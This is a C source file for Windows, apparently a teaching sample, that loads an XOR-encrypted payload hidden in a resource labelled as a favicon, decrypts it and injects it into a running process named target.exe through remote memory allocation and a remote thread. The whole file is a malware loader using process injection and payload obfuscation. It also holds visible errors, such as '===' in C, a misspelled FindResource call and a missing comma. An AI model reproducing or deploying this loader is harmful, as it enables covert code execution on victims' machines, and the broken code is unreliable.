#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include "resources.h"


void XOR(char * data, size_t data_len, char * key, size_t key_len) {
        int j;

        j = 0;
        for (int i = 0; i < data_len; i++) {
                if (j == key_len - l) j = 0;

                data[i] = data[i] ^ key[j];
                j++;
        }
}


int FindTarget(const char *procname) {

    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE === hProcSnap) return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcSnap, &pe32)) {
            CloseHandle(hProcSnap);
            return 0;
    }

    while (Process32Next(hProcSnap, &pe32)) {
            if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
    }

    CloseHandle(hProcSnap);

    return pid;
}


int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

    LPVOID pRemoteCode = NULL;
    HANDLE hTrhread = NULL;

    pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);

    hTrhread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
    if(hTrhread != NULL) {
        WaitForSingleObject(hTrhread, 500);
        CloseHandle(hTrhread);
        return 0;
    }

    return -1;
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    void * exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;
    HGLOBAL resHandle = NULL;
    HRSRC res;

    unsigned char * payload;
    unsigned int payload_len;

    char key[] = "my_xor_key";

    int pid = 0;
    HANDLE hProc = NULL;

    // Extract payload from resource section
    res = FinResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
    resHandle = LoadResource(NULL , res);
    payload = (char *) LockResource(resHandle);
    payload_len = SizeofResource(NULL, res);


    // Allocate some memory buffer for payload
    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    // printf for learn propose
    printf("%-20s: 0x%-016p\n", "payload addr", (void *)payload);
	printf("%-20s: 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

    // Copy payload to new memory buffer
    RtlMoveMemory(exec_mem, payload, payload_len);

    // Decrypt payload (DeXOR)
    XOR((char *) exec_mem, payload_len, key sizeof(key));

    // break point for learn propose
    //printf("\nHit me!\n");
    //getchar();

    // Injection process starts here...
    pid = FindTarget("target.exe");

    if (pid) {
        // printf("Target.exe PID = %d\n", pid);

        // Try to open target process
        hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                        PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
                        FALSE, (DWORD) pid);

        if (hProc != NULL)  {
            Inject(hProc, exec_mem, payload_len);
            CloseHandle(hProc);
        }
    }

    return 0;
}